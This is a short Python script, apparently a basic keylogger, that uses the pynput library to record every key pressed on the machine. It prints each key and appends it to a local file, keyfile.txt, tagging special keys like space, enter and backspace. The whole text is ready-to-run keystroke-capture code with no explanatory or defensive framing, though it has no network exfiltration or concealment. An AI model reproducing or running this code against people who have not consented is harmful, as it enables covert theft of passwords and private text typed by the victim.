from pynput import keyboard

def key_pressed(key):
    print(str(key))

    with open("keyfile.txt", 'a') as log_key:
        try:
            char = key.char
            log_key.write(char)
        except:
            if key == keyboard.Key.space:
                log_key.write(' ')
            elif key == keyboard.Key.enter:
                log_key.write('\n')
            elif key == keyboard.Key.backspace:
                log_key.write('[BACKSPACE]')
            else:
                log_key.write('[' + str(key).replace('Key.', '').upper() + ']')

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=key_pressed)
    listener.start()
    input()